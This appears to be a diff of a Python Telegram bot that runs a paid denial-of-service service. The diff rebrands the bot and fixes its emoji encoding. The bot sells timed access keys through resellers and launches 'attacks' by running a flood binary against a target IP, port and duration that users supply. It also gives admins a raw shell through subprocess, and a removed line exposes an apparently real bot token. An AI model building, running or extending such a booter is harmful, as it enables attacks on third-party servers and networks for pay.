@@ -1,4 +1,8 @@
-
+#SCRIPT BY 
+#@VAMPIREXCHEATS
+#@Legacy4real0
+#@God_x_Sikandar
+#@Mr_sid_001
 import os
 import time
 import json
@@ -18,10 +22,10 @@ from typing import Optional
 
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7635786772:AAHRopYwMGquagLiEXEnhCBUCMJOLeU1Wqg')
+bot = telebot.TeleBot('BOT_TOKEN')
 
 # Insert your admin id here
-admin_id = ["529691217"]
+admin_id = ["ADMIN_ID"]
 
 # Files for data storage
 USER_FILE = "users.json"
@@ -96,7 +100,7 @@ def save_resellers():
 def generate_key(duration):
     characters = string.ascii_letters + string.digits
     random_part = ''.join(random.choice(characters) for _ in range(10)).upper()
-    return f"NINJA-{duration.upper()}-{random_part}"
+    return f"VAMPIREXCHEATS-{duration.upper()}-{random_part}"
 
 def add_time_to_current_date(hours=0):
     return (datetime.datetime.now() + datetime.timedelta(hours=hours)).strftime('%Y-%m-%d %H:%M:%S')
@@ -166,12 +170,12 @@ def start_command(message):
     markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
 
     # Define buttons
-    attack_button = types.KeyboardButton("ðŸš€ Attack")
-    myinfo_button = types.KeyboardButton("ðŸ‘¤ My Info")
-    redeem_button = types.KeyboardButton("ðŸŽŸï¸ Redeem Key")
-    settings_button = types.KeyboardButton("âš™ï¸ Settings")
-    terminal_button = types.KeyboardButton("âºï¸ Terminal")
-    panel_button = types.KeyboardButton("ðŸ”° Panel")  # Adjusted label for clarity
+    attack_button = types.KeyboardButton("🚀 Attack")
+    myinfo_button = types.KeyboardButton("👤 My Info")
+    redeem_button = types.KeyboardButton("🎟️ Redeem Key")
+    settings_button = types.KeyboardButton("⚙️ Settings")
+    terminal_button = types.KeyboardButton("⏺️ Terminal")
+    panel_button = types.KeyboardButton("🔰 Panel")  # Adjusted label for clarity
         
     if str(message.chat.id) in resellers:
         markup.add(attack_button, myinfo_button, redeem_button, panel_button)
@@ -182,9 +186,9 @@ def start_command(message):
     else:
         markup.add(attack_button, myinfo_button, redeem_button)
         
-    bot.reply_to(message, "ð—ªð—²ð—¹ð—°ð—¼ð—ºð—² ð˜ð—¼ NINJA ð—¯ð—¼ð˜!", reply_markup=markup)
+    bot.reply_to(message, "𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼  𝗯𝗼𝘁!", reply_markup=markup)
     
-@bot.message_handler(func=lambda message: message.text == "âš™ï¸ Settings")
+@bot.message_handler(func=lambda message: message.text == "⚙️ Settings")
 def settings_command(message):
     """Admin-only settings menu."""
     user_id = str(message.chat.id)
@@ -199,11 +203,11 @@ def settings_command(message):
         back_button = types.KeyboardButton("<< Back to Menu")
 
         markup.add(threads_button, binary_button, packets_button, command_button, attack_cooldown_button, attack_time_button, back_button)
-        bot.reply_to(message, "âš™ï¸ ð—¦ð—˜ð—§ð—§ð—œð—¡ð—š ð— ð—˜ð—¡ð—¨", reply_markup=markup)
+        bot.reply_to(message, "⚙️ 𝗦𝗘𝗧𝗧𝗜𝗡𝗚 𝗠𝗘𝗡𝗨", reply_markup=markup)
     else:
-        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
+        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
         
-@bot.message_handler(func=lambda message: message.text == "âºï¸ Terminal")
+@bot.message_handler(func=lambda message: message.text == "⏺️ Terminal")
 def terminal_menu(message):
     """Show the terminal menu for admins."""
     user_id = str(message.chat.id)
@@ -214,11 +218,11 @@ def terminal_menu(message):
         download_button = types.KeyboardButton("Download")
         back_button = types.KeyboardButton("<< Back to Menu")
         markup.add(command_button, upload_button, download_button, back_button)
-        bot.reply_to(message, "âš™ï¸ ð—§ð—˜ð—¥ð— ð—œð—¡ð—”ð—Ÿ ð— ð—˜ð—¡ð—¨", reply_markup=markup)
+        bot.reply_to(message, "⚙️ 𝗧𝗘𝗥𝗠𝗜𝗡𝗔𝗟 𝗠𝗘𝗡𝗨", reply_markup=markup)
     else:
-        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
+        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
         
-@bot.message_handler(func=lambda message: message.text == "ðŸ”° Panel")
+@bot.message_handler(func=lambda message: message.text == "🔰 Panel")
 def show_admin_panel(message):
     user_id = str(message.chat.id)
     if user_id in admin_id or resellers:
@@ -228,9 +232,9 @@ def show_admin_panel(message):
         back_button = types.KeyboardButton("<< Back to Menu")
         markup.add(admin_button, reseller_manager_button, back_button)
 
-        bot.reply_to(message, "ðŸ”° ð—£ð—”ð—¡ð—˜ð—Ÿ", reply_markup=markup)
+        bot.reply_to(message, "🔰 𝗣𝗔𝗡𝗘𝗟", reply_markup=markup)
     else:
-        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
+        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
         
 @bot.message_handler(func=lambda message: message.text == "Admin Panel")
 def show_key_manager(message):
@@ -244,9 +248,9 @@ def show_key_manager(message):
         back_button = types.KeyboardButton("<< Back to Menu")
         markup.add(genkey_button, add_user_button, unused_keys_button, controll_button, back_button)
 
-        bot.reply_to(message, "â˜£ï¸ ð—”ð——ð— ð—œð—¡ ð—£ð—”ð—¡ð—˜ð—Ÿ", reply_markup=markup)
+        bot.reply_to(message, "☣️ 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟", reply_markup=markup)
     else:
-        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
+        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
         
 @bot.message_handler(func=lambda message: message.text == "Reseller Panel")
 def show_access_manager(message):
@@ -259,9 +263,9 @@ def show_access_manager(message):
         back_button = types.KeyboardButton("<< Back to Menu")
                 
         markup.add(balance_button, genkey_button, back_button)
-        bot.reply_to(message, "ðŸ› ï¸ ð—¥ð—˜ð—¦ð—˜ð—Ÿð—Ÿð—˜ð—¥ ð—£ð—”ð—¡ð—˜ð—Ÿ", reply_markup=markup)
+        bot.reply_to(message, "🛠️ 𝗥𝗘𝗦𝗘𝗟𝗟𝗘𝗥 𝗣𝗔𝗡𝗘𝗟", reply_markup=markup)
     else:
-        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
+        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
 
 @bot.message_handler(func=lambda message: message.text == "<< Back to Menu")
 def back_to_main_menu(message):
@@ -276,7 +280,7 @@ def back_to_main_menu(message):
 # --------------------[ ATTACK SECTION ]----------------------
 
 
-@bot.message_handler(func=lambda message: message.text == "ðŸš€ Attack")
+@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
 def handle_attack(message):
     global attack_in_process
     user_id = str(message.chat.id)
@@ -284,31 +288,31 @@ def handle_attack(message):
     if user_id in users:
         expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
         if datetime.datetime.now() > expiration_date:
-            response = "â—ï¸ð—¬ð—¼ð˜‚ð—¿ ð—®ð—°ð—°ð—²ð˜€ð˜€ ð—µð—®ð˜€ ð—²ð˜…ð—½ð—¶ð—¿ð—²ð—±â—ï¸"
+            response = "❗️𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗲𝘅𝗽𝗶𝗿𝗲𝗱❗️"
             bot.reply_to(message, response)
             return       
     else:
-        bot.reply_to(message, "â›”ï¸ ð—¨ð—»ð—®ð˜‚ð˜ð—¼ð—¿ð—¶ð˜€ð—²ð—± ð—”ð—°ð—°ð—²ð˜€ð˜€! â›”ï¸\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\nðŸ‘‰ Contact an Admin or the Owner for approval.\nðŸŒŸ Become a proud supporter and purchase approval.\nðŸ’¬ Chat with an admin now and level up your experience!\n\nLet's get you the access you need!")
+        bot.reply_to(message, "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\nOops! It seems like you don't have permission to use the Attack command. To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n🌟 Become a proud supporter and purchase approval.\n💬 Chat with an admin now and level up your experience!\n\nLet's get you the access you need!")
         return
     
     if attack_in_process:
-        bot.reply_to(message, "â›”ï¸ ð—”ð—» ð—®ð˜ð˜ð—®ð—°ð—¸ ð—¶ð˜€ ð—®ð—¹ð—¿ð—²ð—®ð—±ð˜† ð—¶ð—» ð—½ð—¿ð—¼ð—°ð—²ð˜€ð˜€.\nð—¨ð˜€ð—² /check ð˜ð—¼ ð˜€ð—²ð—² ð—¿ð—²ð—ºð—®ð—¶ð—»ð—¶ð—»ð—´ ð˜ð—¶ð—ºð—²!")
+        bot.reply_to(message, "⛔️ 𝗔𝗻 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗶𝗻 𝗽𝗿𝗼𝗰𝗲𝘀𝘀.\n𝗨𝘀𝗲 /check 𝘁𝗼 𝘀𝗲𝗲 𝗿𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝘁𝗶𝗺𝗲!")
         return
 
     if attack_in_process:
-        bot.reply_to(message, "â›”ï¸ ð—”ð—» ð—®ð˜ð˜ð—®ð—°ð—¸ ð—¶ð˜€ ð—®ð—¹ð—¿ð—²ð—®ð—±ð˜† ð—¶ð—» ð—½ð—¿ð—¼ð—°ð—²ð˜€ð˜€.\nð—¨ð˜€ð—² /check ð˜ð—¼ ð˜€ð—²ð—² ð—¿ð—²ð—ºð—®ð—¶ð—»ð—¶ð—»ð—´ ð˜ð—¶ð—ºð—²!")
+        bot.reply_to(message, "⛔️ 𝗔𝗻 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗶𝗻 𝗽𝗿𝗼𝗰𝗲𝘀𝘀.\n𝗨𝘀𝗲 /check 𝘁𝗼 𝘀𝗲𝗲 𝗿𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝘁𝗶𝗺𝗲!")
         return
 
-    response = "ð—˜ð—»ð˜ð—²ð—¿ ð˜ð—µð—² ð˜ð—®ð—¿ð—´ð—²ð˜ ð—¶ð—½, ð—½ð—¼ð—¿ð˜ ð—®ð—»ð—± ð—±ð˜‚ð—¿ð—®ð˜ð—¶ð—¼ð—» ð—¶ð—» ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€ ð˜€ð—²ð—½ð—®ð—¿ð—®ð˜ð—²ð—± ð—¯ð˜† ð˜€ð—½ð—®ð—°ð—²"
+    response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
     bot.reply_to(message, response)
     bot.register_next_step_handler(message, process_attack_details)
      
 def format_countdown_message(target: str, port: int, time_remaining: int, username: str) -> str:
     """Format the countdown message with attack details"""
-    return (f"ðŸš€ ð—”ð˜ð˜ð—®ð—°ð—¸ ð—¦ð—²ð—»ð˜ ð—¦ð˜‚ð—°ð—°ð—²ð˜€ð˜€ð—³ð˜‚ð—¹ð—¹ð˜†! ðŸš€\n\n"
-            f"ð—§ð—®ð—¿ð—´ð—²ð˜: {target}:{port}\n"
-            f"ð—§ð—¶ð—ºð—²: {time_remaining} ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€\n"
-            f"ð—”ð˜ð˜ð—®ð—°ð—¸ð—²ð—¿: @{username}")
+    return (f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n"
+            f"𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n"
+            f"𝗧𝗶𝗺𝗲: {time_remaining} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n"
+            f"𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}")
 
 def update_countdown_timer(message_id: int, chat_id: int, target: str, port: int, duration: int, username: str) -> None:
     """Update the countdown timer in real-time"""
@@ -361,14 +365,14 @@ def process_attack_details(message):
     binary_name = f"{BINARY}{user_id}"
 
     if len(details) != 3:
-        bot.reply_to(message, "â—ï¸ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð—™ð—¼ð—¿ð—ºð—®ð˜â—ï¸\n")
+        bot.reply_to(message, "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗙𝗼𝗿𝗺𝗮𝘁❗️\n")
         return
 
     if user_id in user_last_attack:
         time_since_last_attack = (datetime.datetime.now() - user_last_attack[user_id]).total_seconds()
         if time_since_last_attack < ATTACK_COOLDOWN:
             remaining_cooldown = int(ATTACK_COOLDOWN - time_since_last_attack)
-            bot.reply_to(message, f"â›” ð—¬ð—¼ð˜‚ ð—»ð—²ð—²ð—± ð˜ð—¼ ð˜„ð—®ð—¶ð˜ {remaining_cooldown} ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€ ð—¯ð—²ð—³ð—¼ð—¿ð—² ð—®ð˜ð˜ð—®ð—°ð—¸ð—¶ð—»ð—´ ð—®ð—´ð—®ð—¶ð—».")
+            bot.reply_to(message, f"⛔ 𝗬𝗼𝘂 𝗻𝗲𝗲𝗱 𝘁𝗼 𝘄𝗮𝗶𝘁 {remaining_cooldown} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗮𝘁𝘁𝗮𝗰𝗸𝗶𝗻𝗴 𝗮𝗴𝗮𝗶𝗻.")
             return
 
     try:
@@ -378,19 +382,19 @@ def process_attack_details(message):
 
         # Security checks
         if not target.startswith(ALLOWED_IP_PREFIXES):
-            bot.reply_to(message, "â›”ï¸ ð—˜ð—¿ð—¿ð—¼ð—¿: ð—¨ð˜€ð—² ð˜ƒð—®ð—¹ð—¶ð—± ð—œð—£ ð˜ð—¼ ð—®ð˜ð˜ð—®ð—°ð—¸")
+            bot.reply_to(message, "⛔️ 𝗘𝗿𝗿𝗼𝗿: 𝗨𝘀𝗲 𝘃𝗮𝗹𝗶𝗱 𝗜𝗣 𝘁𝗼 𝗮𝘁𝘁𝗮𝗰𝗸")
             return
 
         if port not in ALLOWED_PORT_RANGE:
-            bot.reply_to(message, f"â›”ï¸ ð—”ð˜ð˜ð—®ð—°ð—¸ ð—®ð—¿ð—² ð—¼ð—»ð—¹ð˜† ð—®ð—¹ð—¹ð—¼ð˜„ð—²ð—± ð—¼ð—» ð—½ð—¼ð—¿ð˜ð˜€ ð—¯ð—²ð˜ð˜„ð—²ð—²ð—» [10003 - 29999]")
+            bot.reply_to(message, f"⛔️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗮𝗿𝗲 𝗼𝗻𝗹𝘆 𝗮𝗹𝗹𝗼𝘄𝗲𝗱 𝗼𝗻 𝗽𝗼𝗿𝘁𝘀 𝗯𝗲𝘁𝘄𝗲𝗲𝗻 [10003 - 29999]")
             return
 
         if port in BLOCKED_PORTS:
-            bot.reply_to(message, f"â›”ï¸ ð—£ð—¼ð—¿ð˜ {port} ð—¶ð˜€ ð—¯ð—¹ð—¼ð—°ð—¸ð—²ð—± ð—®ð—»ð—± ð—°ð—®ð—»ð—»ð—¼ð˜ ð—¯ð—² ð˜‚ð˜€ð—²ð—±!")
+            bot.reply_to(message, f"⛔️ 𝗣𝗼𝗿𝘁 {port} 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱 𝗮𝗻𝗱 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗲 𝘂𝘀𝗲𝗱!")
             return
 
         if time_duration > MAX_ATTACK_TIME:
-            bot.reply_to(message, f"â›”ï¸ ð— ð—®ð˜…ð—¶ð—ºð˜‚ð—º ð—®ð˜ð˜ð—®ð—°ð—¸ ð˜ð—¶ð—ºð—² ð—¶ð˜€ {MAX_ATTACK_TIME} ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€!")
+            bot.reply_to(message, f"⛔️ 𝗠𝗮𝘅𝗶𝗺𝘂𝗺 𝗮𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲 𝗶𝘀 {MAX_ATTACK_TIME} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀!")
             return
 
         # Set up attack command
@@ -402,7 +406,7 @@ def process_attack_details(message):
         elif full_command_type == 3:
             full_command = f"./{binary_name} {target} {port} {time_duration} {packets} {threads}"
         else:
-            bot.reply_to(message, "â›”ï¸ ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð—°ð—¼ð—ºð—ºð—®ð—»ð—± ð˜ð˜†ð—½ð—²!")
+            bot.reply_to(message, "⛔️ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝘁𝘆𝗽𝗲!")
             return
 
         username = message.chat.username or "No username"
@@ -434,7 +438,7 @@ def process_attack_details(message):
         threading.Timer(time_duration, reset_attack_status, args=[user_id]).start()
 
     except ValueError:
-        bot.reply_to(message, "â—ï¸ð—œð—»ð˜ƒð—®ð—¹ð—¶ð—± ð—™ð—¼ð—¿ð—ºð—®ð˜â—ï¸")
+        bot.reply_to(message, "❗️𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗙𝗼𝗿𝗺𝗮𝘁❗️")
 
 @bot.message_handler(commands=['check'])
 def show_remaining_attack_time(message):
@@ -443,18 +447,18 @@ def show_remaining_attack_time(message):
         remaining_time = max(0, attack_duration - elapsed_time)
 
         if remaining_time > 0:
-            response = f"ðŸš¨ ð—”ð˜ð˜ð—®ð—°ð—¸ ð—¶ð—» ð—½ð—¿ð—¼ð—´ð—¿ð—²ð˜€ð˜€! ðŸš¨\n\nð—¥ð—²ð—ºð—®ð—¶ð—»ð—¶ð—»ð—´ ð˜ð—¶ð—ºð—²: {int(remaining_time)} ð˜€ð—²ð—°ð—¼ð—»ð—±ð˜€."
+            response = f"🚨 𝗔𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀! 🚨\n\n𝗥𝗲𝗺𝗮𝗶𝗻𝗶𝗻𝗴 𝘁𝗶𝗺𝗲: {int(remaining_time)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀."
         else:
-            response = "âœ… ð—§ð—µð—² ð—®ð˜ð˜ð—®ð—°ð—¸ ð—µð—®ð˜€ ð—³ð—¶ð—»ð—¶ð˜€ð—µð—²ð—±!"
+            response = "✅ 𝗧𝗵𝗲 𝗮𝘁𝘁𝗮𝗰𝗸 𝗵𝗮𝘀 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱!"
     else:
-        response = "âœ… ð—¡ð—¼ ð—®ð˜ð˜ð—®ð—°ð—¸ ð—¶ð˜€ ð—°ð˜‚ð—¿ð—¿ð—²ð—»ð˜ð—¹ð˜† ð—¶ð—» ð—½ð—¿ð—¼ð—´ð—¿ð—²ð˜€ð˜€"
+        response = "✅ 𝗡𝗼 𝗮𝘁𝘁𝗮𝗰𝗸 𝗶𝘀 𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝗹𝘆 𝗶𝗻 𝗽𝗿𝗼𝗴𝗿𝗲𝘀𝘀"
 
     bot.reply_to(message, response)
 
 def reset_attack_status(user_id):
     global attack_in_process
     attack_in_process = False
-    bot.send_message(user_id, "âœ… ð—”ð˜ð˜ð—®ð—°ð—¸ ð—³ð—¶ð—»ð—¶ð˜€ð—µð—²ð—±!")
+    bot.send_message(user_id, "✅ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱!")
     
 # ---------------------------------------------------------------------
 #   
@@ -463,7 +467,7 @@ def reset_attack_status(user_id):
 #
 # --------------------[ USERS AND SYSTEM INFO ]----------------------
 
-@bot.message_handler(func=lambda message: message.text == "ðŸ‘¤ My Info")
+@bot.message_handler(func=lambda message: message.text == "👤 My Info")
 def my_info(message):
     user_id = str(message.chat.id)
     username = message.chat.username or "No username"
@@ -477,24 +481,24 @@ def my_info(message):
         try:
             exp_datetime = datetime.datetime.strptime(expiration_date, '%Y-%m-%d %H:%M:%S')
             if current_time < exp_datetime:
-                status = "Active âœ…"
-                expiry_text = f"ðŸ›… ð—˜ð˜…ð—½ð—¶ð—¿ð—®ð˜ð—¶ð—¼ð—»: {convert_utc_to_ist(expiration_date)}\n"
+                status = "Active ✅"
+                expiry_text = f"🛅 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {convert_utc_to_ist(expiration_date)}\n"
             else:
-                status = "Inactive âŒ"
-                expiry_text = "ðŸ›… ð—˜ð˜…ð—½ð—¶ð—¿ð—®ð˜ð—¶ð—¼ð—»: Expired ðŸš«\n"  
+                status = "Inactive ❌"
+                expiry_text = "🛅 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: Expired 🚫\n"  
         except ValueError:
-            status = "Inactive âŒ"
-            expiry_text = "ðŸ›… ð—˜ð˜…ð—½ð—¶ð—¿ð—®ð˜ð—¶ð—¼ð—»: Expired ðŸš«\n"
+            status = "Inactive ❌"
+            expiry_text = "🛅 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: Expired 🚫\n"
     else:
-        status = "Inactive âŒ"
-        expiry_text = "ðŸ›… ð—˜ð˜…ð—½ð—¶ð—¿ð—®ð˜ð—¶ð—¼ð—»: Not approved\n"
+        status = "Inactive ❌"
+        expiry_text = "🛅 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: Not approved\n"
 
     response = (
-        f"ðŸ‘¤ ð—¨ð—¦ð—˜ð—¥ ð—œð—¡ð—™ð—¢ð—¥ð— ð—”ð—§ð—œð—¢ð—¡ ðŸ‘¤\n\n"
-        f"ðŸ›‚ ð—¥ð—¼ð—¹ð—²: {role}\n"
-        f"â„¹ï¸ ð—¨ð˜€ð—²ð—¿ð—»ð—®ð—ºð—²: @{username}\n"
-        f"ðŸ†” ð—¨ð˜€ð—²ð—¿ð—œð——: {user_id}\n"
-        f"ðŸ“³ ð—¦ð˜ð—®ð˜ð˜‚ð˜€: {status}\n"
+        f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
+        f"🛂 𝗥𝗼𝗹𝗲: {role}\n"
+        f"ℹ️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
+        f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}\n"
+        f"📳 𝗦𝘁𝗮𝘁𝘂𝘀: {status}\n"
         f"{expiry_text}"
     )
 
@@ -516,7 +520,7 @@ def show_recent_logs(message):
             response = "No data found"
             bot.reply_to(message, response)
     else:
-        response = "â›”ï¸ ð—”ð—°ð—°ð—²ð˜€ð˜€ ð——ð—²ð—»ð—¶ð—²ð—±: ð—”ð—±ð—ºð—¶ð—» ð—¼ð—»ð—¹ð˜† ð—°ð—¼ð—ºð—ºð—®ð—»ð—± DM TO BUY @NINJAGAMEROP"
+        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 DM TO BUY @VAMPIREXCHEATS"
         bot.reply_to(message, response)
         
 @bot.message_handler(commands=['status'])
@@ -526,19 +530,19 @@ def status_command(message):
     if user_id in admin_id:
         # Prepare the status message
         status_message = (
-            f"â˜£ï¸ ð—”ð—§ð—§ð—”ð—–ð—ž ð—¦ð—§ð—”ð—§ð—¨ð—¦ â˜£ï¸\n\n"
-            f"â–¶ï¸ ð—”ð˜ð˜ð—®ð—°ð—¸ ð—°ð—¼ð—¼ð—¹ð—±ð—¼ð˜„ð—»: {ATTACK_COOLDOWN}\n"
-            f"â–¶ï¸ ð—”ð˜ð˜ð—®ð—°ð—¸ ð˜ð—¶ð—ºð—²: {MAX_ATTACK_TIME}\n\n"
+            f"☣️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗧𝗨𝗦 ☣️\n\n"
+            f"▶️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝗰𝗼𝗼𝗹𝗱𝗼𝘄𝗻: {ATTACK_COOLDOWN}\n"
+            f"▶️ 𝗔𝘁𝘁𝗮𝗰𝗸 𝘁𝗶𝗺𝗲: {MAX_ATTACK_TIME}\n\n"
             f"-----------------------------------\n"
-            f"âœ´ï¸ ð—”ð—§ð—§ð—”ð—–ð—ž ð—¦ð—˜ð—§ð—§ð—œð—¡ð—šð—¦ âœ´ï¸\n\n"
-            f"â–¶ï¸ ð—£ð—®ð—¿ð—®ð—ºð—²ð˜ð—²ð—¿ð˜€: {full_command_type}\n" 
-            f"â–¶ï¸ ð—•ð—¶ð—»ð—®ð—¿ð˜† ð—»ð—®ð—ºð—²: {BINARY}\n"
-            f"â–¶ï¸ ð—§ð—µð—¿ð—²ð—®ð—±ð˜€: {threads}\n"
-            f"â–¶ï¸ ð—£ð—®ð—°ð—¸ð—²ð˜ð˜€: {packets}\n"
+            f"✴️ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦 ✴️\n\n"
+            f"▶️ 𝗣𝗮𝗿𝗮𝗺𝗲𝘁𝗲𝗿𝘀: {full_command_type}\n" 
+            f"▶️ 𝗕𝗶𝗻𝗮𝗿𝘆 𝗻𝗮𝗺𝗲: {BINARY}\n"
+            f"▶️ 𝗧𝗵𝗿𝗲𝗮𝗱𝘀: {threads}\n"
+            f"▶️ 𝗣𝗮𝗰𝗸𝗲𝘁𝘀: {packets}\n"
         )
         bot.reply_to(message, status_message)
     else:
-        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—» @NINJAGAMEROP.")
+        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻 @VAMPIREXCHEATS.")
         
 # --------------------------------------------------------------
         
@@ -557,10 +561,10 @@ def command_to_terminal(message):
     user_id = str(message.chat.id)
     
     if user_id in admin_id:
-        bot.reply_to(message, "ð—˜ð—»ð˜ð—²ð—¿ ð˜ð—µð—² ð—°ð—¼ð—ºð—ºð—®ð—»ð—±:")
+        bot.reply_to(message, "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝗰𝗼𝗺𝗺𝗮𝗻𝗱:")
         bot.register_next_step_handler(message, execute_terminal_command)
     else:
-        bot.reply_to(message, "â›”ï¸ ð—¬ð—¼ð˜‚ ð—®ð—¿ð—² ð—»ð—¼ð˜ ð—®ð—» ð—®ð—±ð—ºð—¶ð—».")
+        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
 
 def execute_terminal_command(message):
     """Execute the terminal command entered by the admin."""
@@ -569,29 +573,29 @@ def execute_terminal_command(message):
         
         # Check if the command starts with any of the blocked prefixes
         if any(command.startswith(blocked_prefix) for blocked_prefix in blocked_prefixes):
-            bot.reply_to(message, "â—ï¸ð—§ð—µð—¶ð˜€ ð—°ð—¼ð—ºð—ºð—®ð—»ð—± ð—¶ð˜€ ð—¯ð—¹ð—¼ð—°ð—¸ð—²ð—±.")
+            bot.reply_to(message, "❗️𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗯𝗹𝗼𝗰𝗸𝗲𝗱.")
             return
         
         # Execute the command if it's not blocked
         result = subprocess.run(command, shell=True, capture_output=True, text=True)
         output = result.stdout if result.stdout else result.stderr
         if output:
